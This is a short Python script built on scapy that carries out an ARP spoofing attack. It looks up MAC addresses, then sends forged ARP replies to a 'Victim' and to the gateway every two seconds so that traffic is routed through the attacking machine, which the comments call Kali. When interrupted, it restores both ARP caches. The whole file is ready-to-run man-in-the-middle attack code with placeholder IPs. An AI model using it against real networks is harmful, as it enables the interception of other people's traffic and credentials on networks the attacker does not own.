import scapy.all as scapy
import time

def get_mac(ip):

    try: 
        # Create ARP request to send to broadcast MAC address
        ether_request = scapy.Ether(dst='ff:ff:ff:ff:ff:ff')
        arp_request = scapy.ARP(pdst=ip)

        # Append previous instructions and send request
        arp_ether_request = ether_request/arp_request
        answered = scapy.srp(arp_ether_request, timeout=1, verbose=False)[0]
        
        return answered[0][1].hwsrc
    
    except IndexError:
        print(f"Couldn't retrieve MAC address from IP: {ip}")
        return None


# Function to create and send packet from Kali to Victim
def packet_victim_kali(target_ip, spoof_ip):

    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet)

def restore_state(destination_ip, source_ip):

    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, count=4, verbose=False)

target_ip = "xxx.xx.x.x"
gateway_ip = "xxx.xx.x.x"

# Try to execute loop
try: 
    
    packets_sent_number = 0 
    # Loop to send 2 packets and print the number sent    
    while True:
        packet_victim_kali(target_ip, gateway_ip)
        packet_victim_kali(gateway_ip, target_ip)
        packets_sent_number = packets_sent_number + 2
        print("\r[+] Packets sent:", packets_sent_number, end="")
        time.sleep(2)
except:
    print("\n[-] CTRL + C detected .......... Stopping script")
    restore_state(target_ip, gateway_ip)
    restore_state(gateway_ip, target_ip)